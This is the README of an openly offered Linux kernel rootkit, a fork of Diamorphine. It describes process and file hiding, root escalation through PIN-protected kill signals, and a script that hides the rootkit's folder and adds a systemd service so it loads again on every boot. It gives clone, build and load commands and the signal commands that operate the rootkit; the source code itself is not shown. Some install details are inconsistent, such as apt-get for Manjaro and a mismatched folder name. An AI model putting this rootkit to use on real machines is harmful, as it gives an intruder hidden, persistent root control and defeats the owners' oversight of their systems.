Diaphantasus
===========

Diaphantasus is a fork of Diamorphine, a LKM rootkit for Linux Kernels 2.6.x/3.x/4.x/5.x and ARM64

Diaphantasus adds pin-protection to the hooked calls for elevating to root and changing the module's visibility. **_The pin is derived from any digits in the MAGIC_PREFIX in ```diamorphine.h```, which by default is ```hide123_``` (so by default the pin is ```123```)._** You will want to change this (see below) before starting the rootkit. You can also change the signal numbers for all three of the hooked calls by editing the ```SIGINVIS```, ```SIGSUPER```, and ```SIGMODINVIS``` found in ```diamorphine.h```.



To add a little security by obscurity, the names of the directories and kernel modules, etc. are left as Diamorphine.

Features
--

- When loaded, the module starts invisible;

- Hide/unhide any process by sending a ```kill -31``` to the process's PID;

- Sending a ```kill -63``` with your pin as the PID toggles the module's visibility;

- Sending a ```kill -64``` with your pin as the PID makes the given user become root;

- Files or directories starting with the MAGIC_PREFIX become invisible;

- Added a start.sh script that 1) automatically hides the rootkit's directory via the MAGIC_PREFIX, 2) builds and loads the rootkit's kernel module, and 3) adds a systemd load service and corresponding boot script to automatically load the rootkit on reboot (right after multi-user.target).

- Source: https://github.com/Caleb-Parks/DiaPhantasus-Rootkit

Install
--

Verify if the kernel is 2.6.x/3.x/4.x/5.x
```
uname -r
```

Install kernel build modules/directories if they're not there already (varies by system).
On Manjaro: 
```
sudo apt-get install -y linux-headers-`uname -r`
```

Clone the repository
```
git clone https://github.com/Caleb-Parks/DiaPhantasus-Rootkit
```

Enter the folder
```
cd Diamorphine
```

Change the default ‎MAGIC_PREFIX
...by editing the ```#define MAGIC_PREFIX "hide123_"``` line of diamorphine.h
```
nano diamorphine.h
```

Start (as root)
```
./start.sh
```

Uninstall
--

The module starts invisible, to remove you need to make it visible by sending a kill -63 with your pin as the PID:
```
kill -63 <yourPin>
```

Then remove the module(as root)
```
rmmod diamorphine
```

References
--
Origional Diamorphine rootkit: https://github.com/m0nad/Diamorphine

Wikipedia Rootkit
https://en.wikipedia.org/wiki/Rootkit

Linux Device Drivers
http://lwn.net/Kernel/LDD3/

LKM HACKING
https://web.archive.org/web/20140701183221/https://www.thc.org/papers/LKM_HACKING.html

Memset's blog
http://memset.wordpress.com/

Linux on-the-fly kernel patching without LKM
http://phrack.org/issues/58/7.html

WRITING A SIMPLE ROOTKIT FOR LINUX
https://web.archive.org/web/20160620231623/http://big-daddy.fr/repository/Documentation/Hacking/Security/Malware/Rootkits/writing-rootkit.txt

Linux Cross Reference
http://lxr.free-electrons.com/

zizzu0 LinuxKernelModules
https://github.com/zizzu0/LinuxKernelModules/

Linux Rootkits: New Methods for Kernel 5.7+
https://xcellerator.github.io/posts/linux_rootkits_11/
